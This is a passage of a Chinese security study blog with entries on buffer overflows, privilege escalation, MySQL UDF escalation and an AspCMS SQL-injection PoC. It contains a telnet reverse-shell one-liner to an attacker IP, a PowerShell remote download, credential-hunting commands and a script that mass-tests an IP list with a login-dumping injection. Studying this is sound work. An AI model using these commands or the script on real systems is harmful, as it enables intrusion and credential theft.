<h2 id="代码-amp-数据"><a href="#代码-amp-数据" class="headerlink" title="代码 &amp; 数据"></a><strong>代码 &amp;</strong> <strong>数据</strong></h2><p>​		缓冲区在系统中的表现形式是多样的，高级语言定义的变量、数组、结构体等在运行时可以说都是保存在缓冲区内的，因此所谓缓冲区可以更抽象地理解为一段可读写的内存区域，缓冲区攻击的最终目的就是希望系统能执行这块可读写内存中已经被蓄意设定好的恶意代码。按照冯·诺依曼存储程序原理，程序代码是作为二进制数据存储在内存的，同样程序的数据也在内存中，因此直接从内存的二进制形式上是无法区分哪些是数据哪些是代码的，这也为缓冲区溢出攻击提供了可能。</p>
<p><img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10184517-d89b6405a3484a998d0d1e083c1e2dba.jpg" alt="img"></p>
<p>​		在上图中，代码存储了用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC指针）只会在代码段和操作系统地址空间（内核态）内寻址。</p>
<p>​		数据段内存储了用户程序的全局变量，文字池等。栈空间存储了用户程序的函数栈帧（包括参数、局部数据等），实现函数调用机制，它的数据增长方向是低地址方向。堆空间存储了程序运行时动态申请的内存数据等，数据增长方向是高地址方向。</p>
<p>​		除了代码段和受操作系统保护的数据区域，其他的内存区域都可能作为缓冲区，因此缓冲区溢出的位置可能在数据段，也可能在堆、栈段。如果程序的代码有软件漏洞，恶意程序会“教唆”程序计数器从上述缓冲区内取指，执行恶意程序提供的数据代码。</p>
<h2 id="函数栈帧"><a href="#函数栈帧" class="headerlink" title="函数栈帧"></a><strong>函数栈帧</strong></h2><p>​		栈的主要功能是实现函数的调用。</p>
<p>​		每次函数调用时，系统会把函数的返回地址（函数调用指令后紧跟指令的地址），一些关键的寄存器值保存在栈内，函数的实际参数和局部变量（包括数据、结构体、对象等）也会保存在栈内。这些数据统称为函数调用的栈帧，而且是每次函数调用都会有个独立的栈帧，这也为递归函数的实现提供了可能。</p>
<p><img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10184553-8259e234239e4e52891460571fd532e2.jpg" alt="img"></p>
<p>​		定义一个简单的函数function，它接受一个整形参数，做一次乘法操作并返回。</p>
<p>​		<code>当调用function(0)时，arg参数记录了值0入栈，并将call function指令下一条指令的地址0x00bd16f0保存到栈内，然后跳转到function函数内部执行。每个函数定义都会有函数头和函数尾代码，如图绿框表示。因为函数内需要用ebp保存函数栈帧基址，因此先保存ebp原来的值到栈内，然后将栈指针esp内容保存到ebp。函数返回前需要做相反的操作——将esp指针恢复，并弹出ebp。这样，函数内正常情况下无论怎样使用栈，都不会使栈失去平衡。</code></p>
<p><code>sub esp,44h指令为局部变量开辟了栈空间，比如ret变量的位置。理论上，function只需要再开辟4字节空间保存ret即可，但是编译器开辟了更多的空间（这个问题很诡异，你觉得呢？）。函数调用结束返回后，函数栈帧恢复到保存参数0时的状态，为了保持栈帧平衡，需要恢复esp的内容，使用add esp,4将压入的参数弹出。</code></p>
<p>​		之所以会有缓冲区溢出的可能，主要是因为栈空间内保存了函数的返回地址。该地址保存了函数调用结束后后续执行的指令的位置。</p>
<h2 id="典型的栈溢出代码"><a href="#典型的栈溢出代码" class="headerlink" title="典型的栈溢出代码"></a>典型的栈溢出代码</h2><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span>(<span class="params">unsigned <span class="built_in">char</span> *data</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    unsigned <span class="built_in">char</span> buffer[BUF_LEN];</span><br><span class="line">    strcpy((<span class="built_in">char</span>*)buffer,(<span class="built_in">char</span>*)data);<span class="comment">//溢出点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​		在使用不安全的strcpy库函数时，系统会盲目地将data的全部数据拷贝到buffer指向的内存区域。buffer的长度是有限的，一旦data的数据长度超过BUF_LEN，便会产生缓冲区溢出。</p>
<p>​		</p>
<p><img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10184630-282e829d31cf4221beb7c2ed327f9993.jpg" alt="img"></p>
<p>​		由于栈是低地址方向增长的，因此局部数组buffer的指针在缓冲区的下方。当把data的数据拷贝到buffer内时，超过缓冲区区域的高地址部分数据会“淹没”原本的其他栈帧数据，根据淹没数据的内容不同，可能会有产生以下情况：</p>
<p>1、淹没了其他的局部变量。如果被淹没的局部变量是条件变量，那么可能会改变函数原本的执行流程。这种方式可以用于破解简单的软件验证。</p>
<p>2、淹没了ebp的值。修改了函数执行结束后要恢复的栈指针，将会导致栈帧失去平衡。</p>
<p>3、淹没了返回地址。这是栈溢出原理的核心所在，通过淹没的方式修改函数的返回地址，使程序代码执行“意外”的流程！</p>
<p>4、淹没参数变量。修改函数的参数变量也可能改变当前函数的执行结果和流程。</p>
<p>5、淹没上级函数的栈帧，情况与上述4点类似，只不过影响的是上级函数的执行。当然这里的前提是保证函数能正常返回，即函数地址不能被随意修改（这可能很麻烦！）。</p>
<p>​		如果在data本身的数据内就保存了一系列的指令的二进制代码，一旦栈溢出修改了函数的返回地址，并将该地址指向这段二进制代码的其实位置，那么就完成了基本的溢出攻击行为。</p>
<p>​		<img src="/2023/03/01/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/10184650-e012f76a285a430da70e67128de2674e.jpg" alt="img"></p>
<p>​		通过计算返回地址内存区域相对于buffer的偏移，并在对应位置构造新的地址指向buffer内部二进制代码的其实位置，便能执行用户的自定义代码！这段既是代码又是数据的二进制数据被称为shellcode，因为攻击者希望通过这段代码打开系统的shell，以执行任意的操作系统命令——比如下载病毒，安装木马，开放端口，格式化磁盘等恶意操作。</p>
<h2 id="借助跳板的栈溢出方式"><a href="#借助跳板的栈溢出方式" class="headerlink" title="借助跳板的栈溢出方式"></a>借助跳板的栈溢出方式</h2><p>​		操作系统每次加载可执行文件到进程空间的位置都是无法预测的，因此栈的位置实际是不固定的，通过硬编码覆盖新返回地址的方式并不可靠。为了能准确定位shellcode的地址，需要借助一些额外的操作，其中最经典的是借助跳板的栈溢出方式。</p>
<p>↓↓↓往下涉及知识盲区，以后学完再来看</p>
<p><a href="https://www.cnblogs.com/fanzhidongyzby/p/3250405.html">https://www.cnblogs.com/fanzhidongyzby/p/3250405.html</a></p>
<p>参考文章：</p>
<p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a></p>
<p><a href="https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15573423?fromModule=lemma_inlink">https://baike.baidu.com/item/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/15573423?fromModule=lemma_inlink</a></p>
<p><a href="https://baike.baidu.com/item/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2961793?fr=aladdin">https://baike.baidu.com/item/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/2961793?fr=aladdin</a></p>
<p><a href="https://www.cnblogs.com/fanzhidongyzby/p/3250405.html">https://www.cnblogs.com/fanzhidongyzby/p/3250405.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>缓冲区溢出漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>python的写入模式</title>
    <url>/2023/02/28/python%E7%9A%84%E5%86%99%E5%85%A5%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p><a href="https://so.csdn.net/so/search?q=python&spm=1001.2101.3001.7020">python</a>进行文件读写的时候，需要注意他的模式</p>
<p><img src="/2023/02/28/python%E7%9A%84%E5%86%99%E5%85%A5%E6%A8%A1%E5%BC%8F/20210312112329568-1679552465000-3.png" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>‘rb’:以二进制方式读取</p>
<p> ‘wb’:以二进制方式写入</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/liulanba/article/details/114691934">https://blog.csdn.net/liulanba/article/details/114691934</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>权限提升总结</title>
    <url>/2023/02/28/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="一、常见cmd的命令"><a href="#一、常见cmd的命令" class="headerlink" title="一、常见cmd的命令"></a>一、常见cmd的命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令                          //描述</span><br><span class="line">systeminfo  　　　　　　　　//打印系统信息</span><br><span class="line">whoami      　　　　　　　　//获得当前用户名</span><br><span class="line">whoami /priv    　　　　　　//当前账户权限</span><br><span class="line">ipconfig        　　　　　  //网络配置信息</span><br><span class="line">ipconfig /displaydns        //显示DNS缓存</span><br><span class="line">route print                 //打印出路由表</span><br><span class="line">arp -a                      //打印arp表</span><br><span class="line">hostname                    //主机名</span><br><span class="line">net user                    //列出用户</span><br><span class="line">net user UserName           //关于用户的信息</span><br><span class="line">net user \SMBPATH Pa$$w0rd /u:UserName      //连接SMB</span><br><span class="line">net localgroup              //列出所有组</span><br><span class="line">net localgroup GROUP        //关于指定组的信息</span><br><span class="line">net view \127.0.0.1         //会话打开到当前计算机</span><br><span class="line">net session                 //开发给其他机器</span><br><span class="line">netsh firewall show config  //显示防火墙配置</span><br><span class="line">DRIVERQUERY             　　//列出安装的驱动</span><br><span class="line">tasklist /svc               //列出服务任务</span><br><span class="line">net start                   //列出启动的服务</span><br><span class="line">dir /s foo                  //在目录中搜索包含指定字符的项</span><br><span class="line">dir /s foo == bar           //同上</span><br><span class="line">sc query                    //列出所有服务</span><br><span class="line">sc qc ServiceName           //找到指定服务的路径</span><br><span class="line">shutdown /r /t 0            //立即重启</span><br><span class="line">type file.txt               //打印出内容</span><br><span class="line">icacls &quot;C:\Example&quot;         //列出权限</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn  //列出已安装的补丁</span><br><span class="line">(New-Object System.Net.WebClient) .DownloadFile(&quot;http://host/file&quot;.&quot;C:\LocalPath&quot;)　//利用ps远程下载文件到本地</span><br><span class="line">accesschk.exe -qwsu &quot;Group&quot;         //修改对象（尝试Everyone，Authenticated Users和/或Users）</span><br></pre></td></tr></table></figure>

<span id="more"></span>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何查看服务器的版本？</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release # 基于 Debian</span><br><span class="line">cat /etc/redhat-release # 基于 Redhat</span><br><span class="line"></span><br><span class="line">如何查看内核的版本信息？</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line"></span><br><span class="line">环境变量里的信息如何查看？</span><br><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br><span class="line"></span><br><span class="line">是否有打印机？</span><br><span class="line">lpstat -a</span><br><span class="line"></span><br><span class="line">应用和服务信息</span><br><span class="line">有什么服务在运行？是以什么样的权限在运行？</span><br><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br><span class="line"></span><br><span class="line">关注一下以 root 权限运行的服务，有可能对我们提权有帮助。</span><br><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br><span class="line"></span><br><span class="line">安装了哪些应用？版本是啥？当前是否在运行？</span><br><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archivesO</span><br><span class="line">ls -alh /var/cache/yum/</span><br><span class="line"></span><br><span class="line">常见的配置文件有哪些？有没有可被攻击的插件安装？</span><br><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.r./</span><br><span class="line"></span><br><span class="line">有什么工作任务计划？</span><br><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">如何查找系统内跟用户名和密码相关的文件？</span><br><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 “password” [filename]</span><br><span class="line">find . -name “*.php” -print0 | xargs -0 grep -i -n “var $password” #</span><br><span class="line">Joomla</span><br><span class="line"></span><br><span class="line">网络通讯相关</span><br><span class="line">系统内是否存在NIC？是否连接这其他网络？</span><br><span class="line">/sbin/ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line"></span><br><span class="line">网络配置信息在哪？</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br><span class="line"></span><br><span class="line">与哪些主机在通讯？</span><br><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br><span class="line"></span><br><span class="line">有哪些关于 IP 和 MAC 地址的缓存？</span><br><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">/sbin/route -nee</span><br><span class="line"></span><br><span class="line">如何抓取流量？怎么看？</span><br><span class="line">tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</span><br><span class="line">注意：tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</span><br><span class="line"></span><br><span class="line">如何得到一个 shell 连接？你可以与系统交互吗？</span><br><span class="line">nc -lvp 4444 # 在攻击者的 PC 上执行</span><br><span class="line">nc -lvp 4445 # 在受害者的 PC 上执行</span><br><span class="line">telnet [atackers ip] 4444 | /bin/sh | telnet [local ip] 4445 # 在受害者的</span><br><span class="line">PC 上执行</span><br><span class="line"></span><br><span class="line">lsof -i:8080：查看8080端口占用</span><br><span class="line">lsof abc.txt：显示开启文件abc.txt的进程</span><br><span class="line">lsof -c abc：显示abc进程现在打开的文件</span><br><span class="line">lsof -c -p 1234：列出进程号为1234的进程所打开的文件</span><br><span class="line">lsof -g gid：显示归属gid的进程情况</span><br><span class="line">lsof +d /usr/local/：显示目录下被进程开启的文件</span><br><span class="line">lsof +D /usr/local/：同上，但是会搜索目录下的目录，时间较长</span><br><span class="line">lsof -d 4：显示使用fd为4的进程</span><br><span class="line">lsof -i -U：显示所有打开的端口和UNIX domain文件</span><br><span class="line">netstat -anp //显示系统端口使用情况</span><br><span class="line">netstat -tunlp | grep 80   //查看所有80端口使用情况</span><br><span class="line">netstat -ntlp   //查看当前所有tcp端口</span><br></pre></td></tr></table></figure>





<h3 id="二、权限认识"><a href="#二、权限认识" class="headerlink" title="二、权限认识"></a>二、权限认识</h3><p><strong>windows权限认识(用户及用户组)</strong></p>
<p>Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions),它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。</p>
<p><strong>0x01 普通权限</strong></p>
<p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，<em><strong>管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。</strong></em>其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。</p>
<p>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。 </p>
<p><strong>0x02特殊权限</strong></p>
<p>除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:<em><strong>SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者)</strong></em> 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>真正拥有“完全访问权”的只有一个成员:<strong>SYSTEM</strong>。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br>被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。</p>
<h3 id="三、溢出漏洞思路"><a href="#三、溢出漏洞思路" class="headerlink" title="三、溢出漏洞思路"></a>三、溢出漏洞思路</h3><p>信息收集—&gt;补丁筛选—&gt;利用MSF或特定EXP-执行</p>
<h3 id="三、AT-amp-SC-amp-PS"><a href="#三、AT-amp-SC-amp-PS" class="headerlink" title="三、AT&amp;SC&amp;PS"></a>三、AT&amp;SC&amp;PS</h3><ol>
<li><p>at提权：</p>
<p><code>at 21:26 /interactive cmd.exe //给系统添加一项作业，在21:26打开cmd命令</code></p>
</li>
</ol>
<p>​		at  &#x2F;&#x2F;查看作业详情</p>
<p>​		at &#x2F;del &#x2F;&#x2F;删除作业</p>
<p>​		只针对win7之前的老系统</p>
<p>​		弹出cmd后即为system权限</p>
<p>2.sc提权</p>
<p>​		<code>sc Create syscmd binPath = &quot;cmd /k start&quot; type= own type= interact</code></p>
<p>​		&lt;1&gt;首先whoami查看用户身份为管理员</p>
<p>​		&lt;2&gt;使用sc命令创建一个服务，启动这个服务</p>
<p>​		&lt;3&gt;弹出cmd窗口，运行whoami，发现已经取得了system权限，提权成功。</p>
<p>3.ps提权</p>
<p>​		pstools是微软官方工具，是为windows提供的第三方工具库</p>
<p>​		下载地址：<code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</code></p>
<p>​		<code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
<p>​		win10之前有效</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_42596710/article/details/120649507">https://blog.csdn.net/weixin_42596710/article/details/120649507</a></p>
<p><a href="https://blog.csdn.net/qq_17204441/article/details/89063095">https://blog.csdn.net/qq_17204441/article/details/89063095</a></p>
<p><a href="https://www.wangan.com/wenda/4462">https://www.wangan.com/wenda/4462</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI3MjY1ODI2Ng==&mid=2247485996&idx=1&sn=0a08bf2f04eed49542a96cee6928a561&chksm=eb2e7019dc59f90f55b0aaabf7a59a16a4e06bf941beda82e2e61e807da3ca8d4c2e247173ad&scene=27">https://mp.weixin.qq.com/s?__biz=MzI3MjY1ODI2Ng==&amp;mid=2247485996&amp;idx=1&amp;sn=0a08bf2f04eed49542a96cee6928a561&amp;chksm=eb2e7019dc59f90f55b0aaabf7a59a16a4e06bf941beda82e2e61e807da3ca8d4c2e247173ad&amp;scene=27</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>cmd命令</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>UDF提权思路</title>
    <url>/2023/02/27/UDF%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h2><p>全称为：<strong>user defined function</strong>，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 **contact()<strong>，</strong>user()，version()**等函数。</p>
<p><strong>udf 文件后缀一般为 dll</strong>，由C、C++编写</p>
<span id="more"></span>

<h2 id="UDF在渗透中的作用"><a href="#UDF在渗透中的作用" class="headerlink" title="UDF在渗透中的作用"></a>UDF在渗透中的作用</h2><p>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；<strong>由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限</strong>，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
<p>（一般来说，mssql的sa账号即为管理员账号）</p>
<p>拥有将udf.dll写入相应目录的权限。</p>
<h2 id="数据库版本问题"><a href="#数据库版本问题" class="headerlink" title="数据库版本问题"></a>数据库版本问题</h2><p>xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th align="center">版本</th>
<th align="center">路径</th>
</tr>
</thead>
<tbody><tr>
<td align="center">MySQL &lt; 5.0</td>
<td align="center">导出路径随意；</td>
</tr>
<tr>
<td align="center">5.0 &lt;&#x3D; MySQL&lt; 5.1</td>
<td align="center">需要导出至目标服务器的系统目录（如：c:&#x2F;windows&#x2F;system32&#x2F;）</td>
</tr>
<tr>
<td align="center">5.1 &lt; MySQL</td>
<td align="center">必须导出到MySQL安装目录下的lib\plugin文件夹下（<strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong>）</td>
</tr>
</tbody></table>
<p>判断代码：</p>
<p><code>select version();</code></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p><strong>1、获取Mysql安装路径</strong></p>
<p>​		<code>select @@basedir;</code></p>
<p><strong>2、查看可操作路径</strong></p>
<p>​		<code>show global variables like &quot;%secure%&quot;</code></p>
<p>​		若<strong>secure_file_priv</strong>值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</p>
<p><strong>3、查看plugin目录路径</strong></p>
<p>​		<code>select @@plugin_dir</code></p>
<p><strong>4、dll上传方式</strong></p>
<ul>
<li>通过webshell上传</li>
<li>以hex方式直接上传</li>
</ul>
<p><strong>5、sqlmap中的udf</strong>*</p>
<p>​		sqlmap中现有的udf文件，分为32位和64位</p>
<p>​	获取方式：<strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img src="/2023/02/27/UDF%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/image-20230227151759907.png" alt="image-20230227151759907"></p>
<p><strong>注意：sqlmap中自带的shell以及一些二进制文件，为了防止误杀都经过异或编码，不能直接使用</strong></p>
<p><strong>利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码</strong></p>
<p><code>cloak.py -d -i D:\safetools\sqlmap-master\data\udf\mysql\windows\64</code></p>
<p>该命令会在目录下生成一个dll的文件<strong>lib_mysqludf_sys.dll</strong></p>
<p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令</p>
<p>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line"></span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line"></span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line"></span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>

<p><strong>攻击过程：</strong></p>
<p><strong>1.将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下（</strong><code>\lib\plugin</code>中<strong>）。</strong></p>
<p><strong>2.mysql中执行以下语句</strong></p>
<p>​		<code>create function sys_eval returns string soname &#39;lib_mysqludf_sys.dll&#39;</code></p>
<ol start="3">
<li><p>执行命令</p>
<p><code>select sys_eval(&#39;ipconfig&#39;)</code></p>
</li>
</ol>
<p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/283566.html">https://www.freebuf.com/articles/web/283566.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>SQL注入漏洞</tag>
        <tag>权限提升</tag>
      </tags>
  </entry>
  <entry>
    <title>AspCMS commentList.asp_poc</title>
    <url>/2023/02/25/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-poc/</url>
    <content><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payload_windos = <span class="string">&#x27;/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20&#123;prefix&#125;user&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;check-&gt;&#x27;</span>+ip)</span><br><span class="line">        ip = ip.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        url = ip</span><br><span class="line">        data_windows = requests.get(url+payload_windos,verify=<span class="literal">False</span>).status_code<span class="comment">#请求状态码</span></span><br><span class="line">        <span class="keyword">if</span>  data_windows == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;vuln.txt&#x27;</span>,<span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                ip = ip.replace(<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                f.write(ip+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>直接拼接注入语句，然后遍历ip.txt文件中的所有ip，然后将验证成功的ip写入vuln.txt文件</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>poc</tag>
        <tag>SQL注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>c段信息收集</title>
    <url>/2023/02/24/c%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><p>IP地址分为A类，B类，C类等。A类的网络位为8位，主机位24位；B类的网络位为16位，主机位16位；C类的网络位为24位，主机位8位。</p>
<span id="more"></span>

<p>通过对C类IP的主机位进行遍历，查找在同一网络位的情况下，存活那些主机，就是C段扫描，</p>
